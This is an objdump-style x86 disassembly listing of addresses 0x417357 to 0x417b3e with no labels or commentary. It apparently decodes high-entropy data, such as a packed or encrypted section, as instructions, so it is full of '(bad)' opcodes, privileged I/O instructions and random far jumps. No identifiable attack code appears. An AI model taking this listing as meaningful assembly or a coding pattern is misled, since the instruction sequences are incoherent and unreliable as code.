  417357:	rol    DWORD PTR [eax],1
  417359:	cli    
  41735a:	mov    ecx,edi
  41735c:	loopne 0x4172f8
  41735e:	mov    ch,0xf
  417360:	arpl   WORD PTR [esi-0x701ecc68],bx
  417366:	ficom  DWORD PTR [ebx-0xaa68e18]
  41736c:	fcmovu st,st(2)
  41736e:	call   0x1c99:0x2c1ea5f9
  417375:	cli    
  417376:	dec    esp
  417377:	sub    cl,BYTE PTR [esi-0x40]
  41737a:	test   eax,0x6c6f82c5
  41737f:	adc    al,0xa3
  417381:	(bad)  
  417382:	fcom   DWORD PTR [eax-0x615c415]
  417388:	jnp    0x4173b9
  41738a:	sbb    edi,DWORD PTR [eax-0x6b]
  41738d:	test   eax,0xc664cb6a
  417392:	in     al,0xaa
  417394:	jle    0x41736f
  417396:	iret   
  417397:	or     ebp,DWORD PTR [eax-0x2d838d11]
  41739d:	sbb    al,BYTE PTR [ebp+eiz*1+0x1068af6d]
  4173a4:	push   edx
  4173a5:	(bad)  
  4173a6:	xor    edi,ebp
  4173a8:	(bad)  
  4173a9:	dec    esi
  4173aa:	repnz stc 
  4173ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173ad:	lods   eax,DWORD PTR ds:[esi]
  4173ae:	jo     0x417388
  4173b0:	enter  0x782,0x63
  4173b4:	sti    
  4173b5:	adc    al,0xb2
  4173b7:	ja     0x4173f9
  4173b9:	(bad)  
  4173ba:	xchg   edx,eax
  4173bb:	adc    eax,DWORD PTR [ebp-0x5f]
  4173be:	push   ebp
  4173bf:	iret   
  4173c0:	adc    ah,bl
  4173c2:	aaa    
  4173c3:	ins    BYTE PTR es:[edi],dx
  4173c4:	or     BYTE PTR [edx+0x57],cl
  4173c7:	addr16 cmp cl,cl
  4173ca:	or     cl,0xee
  4173cd:	adc    eax,0x71d8aa7f
  4173d2:	push   ebp
  4173d3:	push   ss
  4173d4:	sbb    bl,ah
  4173d6:	js     0x41744b
  4173d8:	pop    edx
  4173d9:	xlat   BYTE PTR ds:[ebx]
  4173da:	mov    ch,BYTE PTR [esi-0x45]
  4173dd:	push   0xb684ac8c
  4173e2:	and    bh,BYTE PTR [edx+edi*1]
  4173e5:	shr    eax,0x11
  4173e8:	lahf   
  4173e9:	test   al,0xf9
  4173eb:	adc    BYTE PTR [ebx],dl
  4173ed:	cmp    ebp,DWORD PTR [ebx+0x16ca6b59]
  4173f3:	xor    DWORD PTR [edi+0x14a4658a],esi
  4173f9:	mov    ds:0x51cb6a46,al
  4173fe:	adc    DWORD PTR [edx+edi*8],esi
  417401:	mov    ch,0x67
  417403:	jo     0x417410
  417405:	repnz mov al,0xcb
  417408:	inc    esp
  417409:	outs   dx,DWORD PTR ds:[esi]
  41740a:	cmp    eax,0x856fed07
  41740f:	popa   
  417410:	leave  
  417411:	sub    al,0x1b
  417413:	fist   WORD PTR ds:0xa52ccebd
  417419:	add    BYTE PTR [ebp-0x3e66b129],bh
  41741f:	mov    gs,WORD PTR [ecx]
  417421:	sub    eax,0x125eb8ac
  417426:	jg     0x41746d
  417428:	pop    ds
  417429:	jno    0x41741b
  41742b:	sbb    ebp,DWORD PTR [esi-0x9]
  41742e:	jo     0x417438
  417430:	or     DWORD PTR [ecx-0x64],ebx
  417433:	inc    edx
  417434:	or     al,0x2b
  417436:	mov    al,ds:0x5648011b
  41743b:	adc    eax,0x3f7e495a
  417440:	addr16 pop ecx
  417442:	fild   QWORD PTR [esi]
  417444:	sar    DWORD PTR [esi],0x20
  417447:	outs   dx,BYTE PTR ds:[esi]
  417448:	ror    BYTE PTR [ebp+0x37],cl
  41744b:	xor    al,0x87
  41744d:	xchg   edi,eax
  41744e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41744f:	popa   
  417450:	push   ecx
  417451:	out    dx,eax
  417452:	mov    dh,al
  417454:	xor    ch,bl
  417456:	or     DWORD PTR [edx],ebx
  417458:	lea    ecx,[ecx+0x20]
  41745b:	inc    ebx
  41745c:	xor    bh,BYTE PTR [ecx-0x33]
  41745f:	fs push es
  417461:	xchg   ebp,eax
  417462:	sub    ah,BYTE PTR [ecx]
  417464:	cmp    al,0x5b
  417466:	pop    ss
  417467:	pop    esp
  417468:	into   
  417469:	mov    al,ds:0x84f4d8d8
  41746e:	fisubr WORD PTR [ebx]
  417470:	int    0x59
  417472:	xor    ecx,DWORD PTR [edi-0x62]
  417475:	pop    edi
  417476:	add    BYTE PTR [esi+0x59467e3a],ch
  41747c:	enter  0x3960,0xc5
  417480:	call   0x3e75:0x9bfe5e3f
  417487:	loopne 0x417501
  417489:	pop    ss
  41748a:	jnp    0x417489
  41748c:	xlat   BYTE PTR ds:[ebx]
  41748d:	xor    BYTE PTR [eax+0x54],dh
  417490:	mov    edi,esi
  417492:	jle    0x41749d
  417494:	dec    esi
  417495:	cmp    BYTE PTR ds:0x503fb045,dl
  41749b:	repnz das 
  41749d:	pop    ecx
  41749e:	dec    ecx
  41749f:	sbb    BYTE PTR [esi+0x15],bl
  4174a2:	jp     0x4174ee
  4174a4:	mov    dl,0x73
  4174a6:	adc    BYTE PTR [edx+0x10a42e96],dh
  4174ac:	jb     0x4174e2
  4174ae:	and    edx,DWORD PTR [edi+0x68bb7e94]
  4174b4:	mov    ds:0xcdebf686,al
  4174b9:	jbe    0x41743f
  4174bb:	mov    bl,0x70
  4174bd:	into   
  4174be:	push   eax
  4174bf:	imul   ebp,DWORD PTR [eax+0x369ccd29],0xc8b09da4
  4174c9:	cmp    ch,BYTE PTR ds:0x6d9e57dc
  4174cf:	sar    BYTE PTR [ecx-0x3b8ce144],0x82
  4174d6:	dec    ebx
  4174d7:	es scas eax,DWORD PTR es:[edi]
  4174d9:	mov    edi,0x64277f85
  4174de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174df:	es pop ss
  4174e1:	sbb    cl,bh
  4174e3:	pop    ebp
  4174e4:	sub    ah,dh
  4174e6:	inc    esp
  4174e7:	and    eax,0xf7fed6c4
  4174ec:	shr    eax,0x9a
  4174ef:	push   eax
  4174f0:	lahf   
  4174f1:	lds    ebp,FWORD PTR [ecx+0x3f92cde4]
  4174f7:	xor    ebp,DWORD PTR [ebx-0x4d]
  4174fa:	jle    0x417555
  4174fc:	icebp  
  4174fd:	cdq    
  4174fe:	sti    
  4174ff:	xchg   BYTE PTR ds:0xa090eb7f,bh
  417505:	out    0x6f,al
  417507:	push   ss
  417508:	xor    al,0xfa
  41750a:	sbb    al,BYTE PTR [esi-0x23]
  41750d:	(bad)  
  41750e:	xor    BYTE PTR [ecx],cl
  417510:	cmp    al,0xfb
  417512:	ins    BYTE PTR es:[edi],dx
  417513:	xchg   ebx,eax
  417514:	nop
  417515:	mov    bl,0x89
  417517:	jg     0x4174bb
  417519:	outs   dx,BYTE PTR ds:[esi]
  41751a:	bound  ecx,QWORD PTR [esi+0x51]
  41751d:	inc    edi
  41751e:	jno    0x417545
  417520:	sub    eax,0x7cb41ea3
  417525:	dec    ecx
  417526:	repnz and eax,0xc6fccd43
  41752c:	fwait
  41752d:	pop    eax
  41752e:	rcl    BYTE PTR [ebx-0x47b1fe95],1
  417534:	and    BYTE PTR [esi],ah
  417536:	jl     0x4174ba
  417538:	call   0x8b85:0x17c9f605
  41753f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417540:	out    dx,al
  417541:	es push ebx
  417543:	je     0x41755a
  417545:	call   0x3570:0x75965dae
  41754c:	sbb    BYTE PTR ds:0x593d11f4,0x5
  417553:	out    0xe1,al
  417555:	adc    dh,dh
  417557:	lods   al,BYTE PTR ds:[esi]
  417558:	retf   
  417559:	xchg   esp,eax
  41755a:	les    ecx,FWORD PTR [ebp-0x5e]
  41755d:	out    0x21,al
  41755f:	mov    ecx,0xc0dca446
  417564:	xchg   esi,eax
  417565:	inc    ecx
  417566:	push   esp
  417567:	inc    DWORD PTR [edx]
  417569:	loope  0x417521
  41756b:	or     eax,0xa068c92e
  417570:	stos   BYTE PTR es:[edi],al
  417571:	jg     0x4175c6
  417573:	ret    0x7dfb
  417576:	cli    
  417577:	jecxz  0x4175ab
  417579:	jmp    0xd5ca:0xe1e1cd57
  417580:	cmp    eax,0x94cbc0a1
  417585:	js     0x417548
  417587:	in     al,dx
  417588:	mov    edi,0x59017671
  41758d:	stc    
  41758e:	ss pusha 
  417590:	push   ecx
  417591:	outs   dx,BYTE PTR ds:[esi]
  417592:	sub    ah,BYTE PTR [edx+0x3bd409ba]
  417598:	push   0x87755ccb
  41759d:	pop    es
  41759e:	push   ecx
  41759f:	mov    gs,WORD PTR [edi]
  4175a1:	cmp    cl,BYTE PTR [ebx+edi*2+0x21fc78fd]
  4175a8:	pushf  
  4175a9:	(bad)  
  4175aa:	xlat   BYTE PTR ds:[ebx]
  4175ab:	outs   dx,BYTE PTR ds:[esi]
  4175ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175ad:	call   0x86dcc637
  4175b2:	add    BYTE PTR [esi-0x2e],bh
  4175b5:	nop
  4175b6:	sub    dh,ah
  4175b8:	sub    ebp,DWORD PTR [eax]
  4175ba:	pop    edx
  4175bb:	mov    eax,0x8b1d14ff
  4175c0:	dec    eax
  4175c1:	or     eax,0x8330ae9b
  4175c6:	rcl    BYTE PTR [eax+0x21],0xa8
  4175ca:	or     DWORD PTR [ecx-0x30],0xffffffab
  4175ce:	add    bh,BYTE PTR [ebx-0x29bb717d]
  4175d4:	(bad)  
  4175d5:	(bad)
  4175d8:	pop    ecx
  4175d9:	and    eax,eax
  4175db:	rcl    BYTE PTR [edx+0x39],1
  4175de:	addr16 sti 
  4175e0:	mov    DWORD PTR [esi-0x21f8b054],ebp
  4175e6:	std    
  4175e7:	cdq    
  4175e8:	adc    cl,bh
  4175ea:	rcl    BYTE PTR [eax],cl
  4175ec:	xor    al,0xfa
  4175ee:	mov    esp,0x8f543282
  4175f3:	rcr    cl,1
  4175f5:	lahf   
  4175f6:	enter  0xce7e,0x1f
  4175fa:	pop    eax
  4175fb:	cwde   
  4175fc:	lods   eax,DWORD PTR ds:[esi]
  4175fd:	into   
  4175fe:	inc    ebp
  4175ff:	jns    0x417592
  417601:	jb     0x417614
  417603:	inc    ebx
  417604:	cmp    eax,0xde0829a8
  417609:	pop    ecx
  41760a:	mov    ah,0x30
  41760c:	add    al,BYTE PTR [ecx-0x18d1bddc]
  417612:	jnp    0x417628
  417614:	daa    
  417615:	loope  0x417668
  417617:	xor    ch,BYTE PTR [ebx-0x935d6e2]
  41761d:	ficomp DWORD PTR [ebx]
  41761f:	mov    ebx,0xc6367ffe
  417624:	mov    ds:0xb9c9e14e,eax
  417629:	stc    
  41762a:	outs   dx,DWORD PTR ds:[esi]
  41762b:	psubw  mm0,QWORD PTR [edx+0x7a49c21f]
  417632:	and    eax,0x50cfed03
  417637:	xchg   ebx,eax
  417638:	push   0xfffffff1
  41763a:	xor    al,0x6
  41763c:	fist   WORD PTR [eax+0x5fd152e6]
  417642:	mov    dh,0x34
  417644:	cmp    BYTE PTR [ebx-0x26],al
  417647:	pop    edi
  417648:	cmp    ah,bl
  41764a:	repz add eax,0xe35e4f58
  417650:	rol    BYTE PTR [ecx],cl
  417652:	scas   al,BYTE PTR es:[edi]
  417653:	adc    eax,0x92f25826
  417658:	dec    ebp
  417659:	les    ecx,FWORD PTR [edi]
  41765b:	pop    ss
  41765c:	mov    edx,0xa1d76f89
  417661:	(bad)  
  417662:	jecxz  0x41768e
  417664:	and    DWORD PTR [edi-0x393cd411],edi
  41766a:	add    DWORD PTR [ebx-0x47],edx
  41766d:	scas   al,BYTE PTR es:[edi]
  41766e:	or     DWORD PTR [ebx],ecx
  417670:	push   ebx
  417671:	mov    bl,0x91
  417673:	dec    ecx
  417675:	(bad)  
  417676:	outs   dx,BYTE PTR ds:[esi]
  417677:	out    dx,eax
  417678:	sbb    dl,BYTE PTR [edi]
  41767a:	call   0x3c2d0b99
  41767f:	cdq    
  417680:	adc    BYTE PTR [edi],dl
  417682:	(bad)  
  417683:	and    BYTE PTR [edi],al
  417685:	sub    eax,0xdb179e40
  41768a:	mul    BYTE PTR [esi-0xc95667a]
  417690:	addr16 fwait
  417692:	enter  0x9904,0x1e
  417696:	pop    edx
  417697:	mov    dl,0xe8
  417699:	mov    cl,0x54
  41769b:	pop    ebx
  41769c:	xchg   ebx,eax
  41769d:	repnz add esi,esp
  4176a0:	pop    ss
  4176a1:	push   0xffffff9f
  4176a3:	inc    edi
  4176a4:	out    dx,eax
  4176a5:	int    0x40
  4176a7:	(bad)  
  4176a8:	mov    ds:0xf6e44ba8,eax
  4176ad:	push   ds
  4176ae:	mov    DWORD PTR [eax-0x4a],ecx
  4176b1:	stc    
  4176b2:	xor    DWORD PTR [edi-0x26396172],eax
  4176b8:	pushw  es
  4176ba:	lock push esi
  4176bc:	xor    edi,DWORD PTR ds:0x218d0f77
  4176c2:	out    dx,al
  4176c3:	and    eax,0xdb90485e
  4176c8:	fadd   st,st(0)
  4176ca:	push   eax
  4176cb:	lahf   
  4176cc:	bound  ebp,QWORD PTR [esi+0x50f4d0b]
  4176d2:	xchg   BYTE PTR [edx-0x6938e0a3],dl
  4176d8:	or     al,BYTE PTR [ecx-0x60948bbe]
  4176de:	test   BYTE PTR [edi+0x43],cl
  4176e1:	cli    
  4176e2:	arpl   bx,dx
  4176e4:	jp     0x4176ab
  4176e6:	out    0xe8,al
  4176e8:	xor    al,0x22
  4176ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176eb:	je     0x417735
  4176ed:	cmc    
  4176ee:	mov    esp,0x4c98e2c1
  4176f3:	int    0x1b
  4176f5:	xchg   esi,eax
  4176f6:	stos   DWORD PTR es:[edi],eax
  4176f7:	nop
  4176f8:	fist   WORD PTR [edx]
  4176fa:	xchg   DWORD PTR [ebp+0xacfe5ce],eax
  417700:	add    al,0x27
  417702:	jb     0x417780
  417704:	repnz and DWORD PTR [ebx+0x79a5e9fd],eax
  41770b:	fcmovnu st,st(1)
  41770d:	jb     0x4176fe
  41770f:	sbb    dl,dh
  417711:	add    al,0x14
  417713:	call   0x29a4993d
  417718:	icebp  
  417719:	stc    
  41771a:	and    al,0xb8
  41771c:	push   edx
  41771d:	cli    
  41771e:	dec    eax
  41771f:	xor    ch,ah
  417721:	pop    edi
  417722:	fwait
  417723:	adc    al,0x2a
  417725:	stc    
  417726:	add    eax,DWORD PTR [eax]
  417728:	xor    al,0x76
  41772a:	push   0x3b4f1f1c
  41772f:	xor    bl,BYTE PTR [ecx]
  417731:	mov    fs,WORD PTR [edi+eax*2+0x28]
  417735:	dec    ecx
  417736:	int3   
  417737:	sbb    eax,0x9cb721ba
  41773c:	pop    es
  41773d:	addr16 sbb cl,0x3e
  417741:	dec    ebp
  417742:	push   ss
  417743:	adc    ebp,0x6
  417746:	jle    0x4177b3
  417748:	fnstcw WORD PTR [ebp-0x13812c5e]
  41774e:	dec    ebp
  41774f:	or     eax,0xfe90379a
  417754:	loopne 0x417781
  417756:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417757:	retf   0xff80
  41775a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41775b:	inc    esi
  41775c:	lea    eax,[eax+ecx*1+0x69d9d852]
  417763:	pop    ecx
  417764:	aaa    
  417765:	(bad)  
  417766:	hlt    
  417767:	jg     0x4177c9
  417769:	and    ebx,edi
  41776b:	add    DWORD PTR [edi+esi*1-0x2522781e],edx
  417772:	emms   
  417774:	popf   
  417775:	jno    0x4176fb
  417777:	add    BYTE PTR [ebp-0x57f2f456],0xaa
  41777e:	xchg   esp,eax
  41777f:	or     ch,BYTE PTR [edx-0xe01050]
  417785:	jecxz  0x417770
  417787:	into   
  417788:	pop    ebp
  417789:	stos   BYTE PTR es:[edi],al
  41778a:	cmp    edi,DWORD PTR [ebp+0x48a1e107]
  417790:	mov    esp,0x656bd3b0
  417795:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417796:	imul   esp,DWORD PTR [edi],0xffffffa4
  417799:	mov    ah,0xf8
  41779b:	clc    
  41779c:	mov    dh,0x2d
  41779e:	xchg   edx,eax
  41779f:	mov    esi,esp
  4177a1:	stos   BYTE PTR es:[edi],al
  4177a2:	xor    BYTE PTR [ecx+0x75],dh
  4177a5:	lods   eax,DWORD PTR ds:[esi]
  4177a6:	push   0x1b326a8c
  4177ab:	aam    0x71
  4177ad:	mov    ch,bh
  4177af:	inc    ebp
  4177b0:	mov    DWORD PTR [ebp-0x5a818970],ecx
  4177b6:	scas   al,BYTE PTR es:[edi]
  4177b7:	jbe    0x41782e
  4177b9:	outs   dx,BYTE PTR ds:[esi]
  4177ba:	inc    esp
  4177bb:	aad    0x5e
  4177bd:	xchg   DWORD PTR [ebx+0xe5f2dfe],ecx
  4177c3:	pop    es
  4177c4:	ins    DWORD PTR es:[edi],dx
  4177c5:	pushf  
  4177c6:	inc    eax
  4177c7:	loope  0x41777d
  4177c9:	stos   BYTE PTR es:[edi],al
  4177ca:	mov    ebp,0xb0cae1b
  4177cf:	adc    DWORD PTR [edi+0x78d80ce1],ebx
  4177d5:	fidivr DWORD PTR [ebp+esi*2-0x130076f8]
  4177dc:	out    0x37,al
  4177de:	bound  edx,QWORD PTR [esi+0xb471def]
  4177e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177e5:	jne    0x41777c
  4177e7:	inc    ebp
  4177e8:	rcl    BYTE PTR [eax-0x77558d9f],0xb5
  4177ef:	mov    cl,0x81
  4177f1:	mov    eax,0x966836d3
  4177f6:	cmp    ch,ah
  4177f8:	not    BYTE PTR ds:0x8a84f94e
  4177fe:	xor    bh,BYTE PTR fs:[ebp-0x48]
  417802:	jns    0x417839
  417804:	ret    
  417805:	js     0x417872
  417807:	popf   
  417808:	arpl   WORD PTR [ecx],di
  41780a:	mov    dl,0x17
  41780c:	cwde   
  41780d:	test   DWORD PTR [eax],edx
  41780f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417810:	sbb    DWORD PTR [ebp+0x3],eax
  417813:	add    esp,DWORD PTR [esi]
  417815:	add    BYTE PTR [edi+0x2d],ch
  417818:	jns    0x41788d
  41781a:	sti    
  41781b:	aaa    
  41781c:	cld    
  41781d:	test   DWORD PTR [esi-0x5],ecx
  417820:	mov    esp,0x593e1916
  417825:	adc    ch,BYTE PTR [ebp+0x6de34977]
  41782b:	fucomp st(2)
  41782d:	xchg   BYTE PTR [edx-0x13],ch
  417830:	(bad)  
  417831:	mov    eax,0x70a18b94
  417836:	xchg   bx,ax
  417838:	cmp    edi,DWORD PTR [edi]
  41783a:	push   edx
  41783b:	jbe    0x417858
  41783d:	adc    DWORD PTR [edi-0x1e6a003a],ecx
  417843:	in     eax,0x82
  417845:	shl    DWORD PTR [eax+0x3bc60bd7],cl
  41784b:	out    0x93,eax
  41784d:	ret    0x8e8d
  417850:	enter  0x4d2,0xfe
  417854:	into   
  417855:	int3   
  417856:	inc    ebx
  417857:	and    esi,DWORD PTR ds:0xdca8178f
  41785d:	inc    ebp
  41785e:	mov    esi,0xda828d99
  417863:	ins    BYTE PTR es:[edi],dx
  417864:	adc    dl,BYTE PTR [edx+0x53e10a6b]
  41786a:	imul   edi,DWORD PTR [esp+edi*8+0x5451d27b],0x1f60bad2
  417875:	pop    ebx
  417876:	repz mov edi,ecx
  417879:	das    
  41787a:	loopne 0x417889
  41787c:	fnstenv [edi+0x51]
  41787f:	dec    edi
  417880:	popf   
  417881:	sub    ebp,0x2aa308f3
  417887:	jo     0x417857
  417889:	and    ecx,ebx
  41788b:	dec    edi
  41788c:	repz mov eax,ds:0xb7951235
  417892:	pusha  
  417893:	mov    DWORD PTR [ecx+0x3daf0155],edx
  417899:	in     al,0x3a
  41789b:	mov    edi,DWORD PTR [eax-0x451e4959]
  4178a1:	pop    ds
  4178a2:	repz je 0x41788d
  4178a5:	cmc    
  4178a6:	shr    DWORD PTR [ebx+0x57],1
  4178a9:	sbb    DWORD PTR [eax+0x5c],0x88abe626
  4178b0:	adc    BYTE PTR [edx-0x1a],0x59
  4178b4:	xchg   edi,eax
  4178b5:	mov    esp,es
  4178b7:	or     eax,0x2e8f216
  4178bc:	dec    eax
  4178bd:	and    DWORD PTR [eax],0x43
  4178c0:	cmp    eax,0x29fae95c
  4178c5:	lahf   
  4178c6:	sub    eax,DWORD PTR [ebp+0x41]
  4178c9:	shr    DWORD PTR [ebp-0x7b34b377],0xdc
  4178d0:	mov    ch,0xb1
  4178d2:	popf   
  4178d3:	jne    0x6917e87b
  4178d9:	sub    eax,0x5a07804b
  4178de:	xchg   esp,eax
  4178df:	pushf  
  4178e0:	ins    DWORD PTR es:[edi],dx
  4178e1:	or     dh,BYTE PTR [esi]
  4178e3:	les    ebp,FWORD PTR [esi]
  4178e5:	in     eax,0x65
  4178e7:	dec    eax
  4178e8:	popf   
  4178e9:	push   es
  4178ea:	mov    al,ds:0x25a79461
  4178ef:	jmp    0xcf6d:0x7fd1dfeb
  4178f6:	sub    eax,0xf2f5dd1e
  4178fb:	int    0x1a
  4178fd:	mov    ah,0x2
  4178ff:	cmp    bl,BYTE PTR [edx+0x36]
  417902:	xor    bl,dh
  417904:	or     al,0x13
  417906:	add    edi,eax
  417908:	in     eax,0x5e
  41790a:	mov    edx,0x861e079f
  41790f:	nop
  417910:	je     0x4178ab
  417912:	out    dx,eax
  417913:	mov    ebp,0x20500a05
  417918:	into   
  417919:	push   esi
  41791a:	mov    bl,0x3e
  41791c:	ficom  WORD PTR [ebx-0x3e]
  41791f:	lea    ebx,[ecx+ecx*8+0x620ab92b]
  417926:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417927:	xchg   edx,eax
  417928:	popf   
  417929:	lock test edx,0x5f792cd
  417930:	mov    bh,0x1e
  417932:	jae    0x417917
  417934:	in     eax,dx
  417935:	xchg   edx,eax
  417936:	cmp    al,0x33
  417938:	call   0xa4ae3ad1
  41793d:	rcr    DWORD PTR [eax-0x4ffea566],0xd7
  417944:	lods   al,BYTE PTR ds:[esi]
  417945:	out    dx,al
  417946:	pop    edx
  417947:	gs mov eax,0x630b5ccc
  41794d:	jno    0x417972
  41794f:	xlat   BYTE PTR ds:[ebx]
  417950:	xchg   DWORD PTR [ebp+ebx*8+0x7e],eax
  417954:	jmp    FWORD PTR [eax]
  417956:	scas   al,BYTE PTR es:[edi]
  417957:	sub    eax,ecx
  417959:	xchg   BYTE PTR [ecx-0x1acbb29a],bl
  41795f:	(bad)  
  417960:	xchg   ebx,eax
  417961:	jmp    0x5e19:0x7a0d9d60
  417968:	jmp    0x417966
  41796a:	out    0xc7,al
  41796c:	push   0x524a538e
  417971:	jae    0x4179e0
  417973:	in     eax,0xbb
  417975:	ds in  al,0xd4
  417978:	arpl   WORD PTR [eax+eiz*2],si
  41797b:	cli    
  41797c:	xor    al,0x30
  41797e:	dec    ebx
  41797f:	aaa    
  417980:	xchg   esi,eax
  417981:	test   cl,cl
  417983:	dec    ebp
  417984:	sub    DWORD PTR [ebx],eax
  417986:	pop    esi
  417987:	xchg   esi,eax
  417988:	addr16 xor eax,0x130bae7a
  41798e:	mov    eax,ds:0x4d18631b
  417993:	jecxz  0x417939
  417995:	fidiv  WORD PTR [esi-0x57]
  417998:	cli    
  417999:	daa    
  41799a:	inc    eax
  41799b:	adc    eax,0xaa23c3d
  4179a0:	in     eax,0xd6
  4179a2:	jmp    0x41798a
  4179a4:	sub    DWORD PTR [ebp-0x185da642],ebp
  4179aa:	push   0x84f08dbb
  4179af:	cmp    ch,BYTE PTR [ecx-0x14d9e2f1]
  4179b5:	sbb    ebp,eax
  4179b7:	push   cs
  4179b8:	dec    edi
  4179b9:	mov    edi,0x7088e9ee
  4179be:	push   esi
  4179bf:	xchg   ebp,eax
  4179c0:	mov    esi,0xb1de4182
  4179c5:	pop    esp
  4179c6:	(bad)
  4179ca:	push   edx
  4179cb:	fs pop eax
  4179cd:	nop
  4179ce:	mov    ds:0x1e908215,eax
  4179d3:	call   0xc4fe8159
  4179d8:	xchg   esi,eax
  4179d9:	loop   0x4179bf
  4179db:	push   ds
  4179dc:	push   ebp
  4179dd:	loope  0x41798e
  4179df:	fcomi  st,st(0)
  4179e1:	hlt    
  4179e2:	jne    0x4179c3
  4179e4:	shl    BYTE PTR [esi-0x73680aaa],cl
  4179ea:	nop
  4179eb:	aam    0x87
  4179ed:	(bad)  
  4179ee:	std    
  4179ef:	cmp    DWORD PTR [ebx+0x25],ebx
  4179f2:	popa   
  4179f3:	mov    dl,BYTE PTR [esi]
  4179f5:	jb     0x9e3423c3
  4179fb:	stos   DWORD PTR es:[edi],eax
  4179fc:	lods   eax,DWORD PTR ds:[esi]
  4179fd:	es lahf 
  4179ff:	push   ebx
  417a00:	out    dx,al
  417a01:	sbb    BYTE PTR ds:[edx],al
  417a04:	sbb    bh,bh
  417a06:	call   0xb6e5:0xeb7b97dd
  417a0d:	in     eax,dx
  417a0e:	mov    WORD PTR [edi+0x28d68a47],?
  417a14:	and    edi,edi
  417a16:	inc    eax
  417a17:	inc    edx
  417a18:	adc    ah,ah
  417a1a:	push   ebp
  417a1b:	lock fs inc ebx
  417a1e:	jo     0x417a2d
  417a20:	xchg   esi,eax
  417a21:	inc    edi
  417a22:	sub    edi,DWORD PTR [esi-0x3b]
  417a25:	lods   al,BYTE PTR ds:[esi]
  417a26:	cmp    DWORD PTR [eax-0x5c8816ee],edi
  417a2c:	js     0x417a9f
  417a2e:	sahf   
  417a2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a30:	push   edx
  417a31:	and    cl,ch
  417a33:	mov    bh,0x4f
  417a35:	adc    ebp,edi
  417a37:	sbb    al,0xc8
  417a39:	inc    ecx
  417a3a:	je     0x417ab4
  417a3c:	push   ds
  417a3d:	rcr    al,cl
  417a3f:	cs push edx
  417a41:	inc    ecx
  417a42:	mov    dl,cl
  417a44:	call   DWORD PTR [esi+0x6b8cb87b]
  417a4a:	inc    eax
  417a4b:	push   eax
  417a4c:	inc    ebx
  417a4d:	or     ebp,edi
  417a4f:	mov    ebx,0xa3111543
  417a54:	mov    ah,0x92
  417a56:	xchg   esp,eax
  417a57:	fwait
  417a58:	iret   
  417a59:	xor    DWORD PTR [eax],0xbf0fe78f
  417a5f:	pop    ss
  417a60:	mov    ch,0x80
  417a62:	mov    eax,0xb5cef54a
  417a67:	push   esp
  417a68:	sti    
  417a69:	jmp    0xaafd2c68
  417a6e:	(bad)  
  417a70:	xchg   esp,eax
  417a71:	and    eax,0xd22b1323
  417a76:	outs   dx,DWORD PTR ds:[esi]
  417a77:	jp     0x417acb
  417a79:	mov    ds:0x1c55b238,al
  417a7e:	inc    edx
  417a7f:	enter  0xb621,0x4f
  417a83:	mov    edi,0xe91b5ac7
  417a88:	shl    BYTE PTR [ecx-0x3b],cl
  417a8b:	xor    al,0x7c
  417a8d:	cmp    DWORD PTR [edx],0xfc43233c
  417a93:	jl     0x417a50
  417a95:	stos   DWORD PTR es:[edi],eax
  417a96:	and    al,0x81
  417a98:	stc    
  417a99:	mov    ecx,DWORD PTR [esi-0x72c3d638]
  417a9f:	jl     0x417a60
  417aa1:	sbb    edi,DWORD PTR [ebp-0x70e33a4e]
  417aa7:	mov    ds:0x6cb61777,eax
  417aac:	rcr    DWORD PTR ss:[ecx+0x22],cl
  417ab0:	(bad)  [ecx+0x20]
  417ab3:	jg     0x417aac
  417ab5:	jle    0x417b0e
  417ab7:	lods   eax,DWORD PTR ds:[esi]
  417ab8:	aad    0xd4
  417aba:	jecxz  0x417a5c
  417abc:	pushf  
  417abd:	loop   0x417a42
  417abf:	xor    BYTE PTR [ebx+0x36],al
  417ac2:	fist   DWORD PTR [ecx+0x497851f2]
  417ac8:	pop    ss
  417ac9:	jle    0x417b38
  417acb:	call   0x75a1:0x61fe52b6
  417ad2:	dec    ebx
  417ad3:	dec    ebp
  417ad4:	jecxz  0x417b37
  417ad6:	push   cs
  417ad7:	js     0x417acd
  417ad9:	loope  0x417a9b
  417adb:	xchg   edx,eax
  417adc:	pop    ss
  417add:	mov    ch,0xba
  417adf:	dec    ecx
  417ae0:	scas   eax,DWORD PTR es:[edi]
  417ae1:	or     ecx,DWORD PTR [esi+esi*1]
  417ae4:	test   dl,0xc3
  417ae7:	iret   
  417ae8:	xor    BYTE PTR [ebx-0x71],dl
  417aeb:	xor    eax,0xa435cdd8
  417af0:	loope  0x417b2b
  417af2:	scas   eax,DWORD PTR es:[edi]
  417af3:	dec    esp
  417af4:	fucomi st,st(6)
  417af6:	or     dh,BYTE PTR [ebp+0x29]
  417af9:	pop    ebx
  417afa:	xchg   edx,eax
  417afb:	mov    ch,0xd2
  417afd:	test   BYTE PTR [esi-0x56],dl
  417b00:	pop    esp
  417b01:	cmp    cl,BYTE PTR [ebp+0x19]
  417b04:	sub    DWORD PTR [esi],edi
  417b06:	(bad)
  417b09:	jge    0x417b60
  417b0b:	ret    
  417b0c:	add    DWORD PTR [esi-0x1b],0x582280ca
  417b13:	mov    ds:0x157b7be9,al
  417b18:	pusha  
  417b19:	(bad)  
  417b1a:	aam    0xc4
  417b1c:	and    edx,DWORD PTR [esi-0x7225b85e]
  417b22:	jmp    0x417b66
  417b24:	aad    0xa4
  417b26:	jmp    0x417ad8
  417b28:	sti    
  417b29:	es (bad) 
  417b2b:	popa   
  417b2c:	lods   al,BYTE PTR ds:[esi]
  417b2d:	ss push cs
  417b2f:	mov    ds:0x6bebf6ac,al
  417b34:	pop    esp
  417b35:	mov    BYTE PTR [eax+0x6696dd03],al
  417b3b:	stos   DWORD PTR es:[edi],eax
  417b3c:	hlt    
  417b3d:	pop    edx
  417b3e:	and    ah,BYTE PTR [ecx+0x78ee39ad]
